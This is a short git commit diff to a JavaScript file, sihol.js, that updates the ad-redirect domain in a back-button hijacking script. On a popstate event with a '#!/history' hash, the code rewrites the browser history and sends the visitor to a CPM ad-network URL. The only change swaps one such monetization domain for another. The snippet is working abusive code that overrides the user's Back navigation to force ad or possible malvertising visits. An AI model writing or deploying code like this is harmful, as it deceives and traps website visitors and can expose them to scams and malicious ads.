6bc8910025954496819c3d14cdf4d01e0be4f953
lookatdons <lookatdons@users.noreply.github.com>
2022-03-11 13:41:10 +0700

    Update sihol.js

--- sihol.js
+++ sihol.js
@@ -6,7 +6,7 @@ window.addEventListener("popstate", function() {
   if(location.hash === "#!/history") { 
     history.replaceState(null, document.title, location.pathname); 
     setTimeout(function(){ 
-      location.replace("https://www.trustedcpmrevenue.com/m2iudzu7tp?key=2874d06402b07858a75d12160cdb5474"); 
+      location.replace("https://www.effectivecpmcontent.com/m2iudzu7tp?key=2874d06402b07858a75d12160cdb5474"); 
     },10); 
   } 
 }, false); 
